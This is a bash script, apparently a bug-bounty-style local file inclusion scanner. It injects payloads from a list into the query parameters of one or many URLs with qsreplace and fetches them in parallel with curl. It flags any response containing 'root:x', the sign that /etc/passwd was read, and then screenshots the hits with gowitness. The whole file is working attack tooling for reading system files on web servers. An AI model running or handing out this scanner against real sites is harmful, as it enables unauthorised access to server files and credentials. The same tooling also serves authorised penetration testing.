#!/bin/bash

function banner(){
echo -e '''\033[1;38;5;013m
                   ___   ___  ___ 
             |    |__  |  |  |__  
             |___ |    |  |  |___ 
                                                                  
'''                            
                             echo -e "                       \033[1;38;5;051m  \e[5mRobinTrigon | 3rr0r-404"
echo -e "\033[0m"

}

function menu(){
echo -e " Select Which Type of scan U want to perform."
echo -e " [1] Single url:"
echo -e " [2] Multiple url:"
echo -e " [3] Exit"
read Type
if [ $Type -eq 1 ]; then
 Single
elif [ $Type -eq 2 ]; then
multi
elif [ $Type -eq 3 ]; then
exit
fi
}

function Single(){

	echo -e -n " [*] Enter your url:"
	read url
	echo -e -n " [*] Enter your payload list:"
	read payload
echo -e "\n\033[1;38;5;154m [+] S C A N N I N G.."
for j in $(cat $payload); do

echo "$url" | qsreplace "$j" | tee -a tempredirect.txt
done
for k in $(cat tempredirect.txt);do
	echo "$k" | xargs -P30 -n1 curl|egrep "root:x|demon|root" &>/dev/null && echo -e "$k" | tee -a resulttemp.txt
done
clear
banner
cat resulttemp.txt | sort -u | tamu url
rm tempredirect.txt
rm resulttemp.txt
}



function multi(){


	echo -e -n " [*] Enter your url list:"
	read url

	echo -e -n " [*] Enter your payload list:"
	read payload
echo -e "\n\033[1;38;5;154m [+] S C A N N I N G.."
for i in $(cat $url ); do
for j in $(cat $payload); do

echo "$i" | qsreplace "$j" | tee -a tempredirect.txt
done
done
for k in $(cat tempredirect.txt);do
	echo "$k" | xargs -P30 -n1 curl|grep "root:x" &>/dev/null && echo -e "$k" | tee -a resulttemp.txt
done
clear
banner
cat resulttemp.txt|sort -u | tamu url >>result.txt
cat result.txt|sort -u | tee -a screen.txt

echo -e "\033[0m"

echo -e "\n\033[1;38;5;154m[+]  S C R E E N S H O T I N G . . . . "
echo -e "\033[0m"

gowitness file -f screen.txt 
echo -e "\033[0m"

echo -e " \033[1;38;5;196m[+] \033[1;38;5;040m result save into \033[1;38;5;154m'result.txt' \033[1;38;5;040m and \033[1;38;5;154m'screenshots' \033[1;38;5;040m file !"
echo -e "\033[0m"


rm gowitness.sqlite3

rm resulttemp.txt
rm tempredirect.txt
rm screen.txt

}




banner
menu


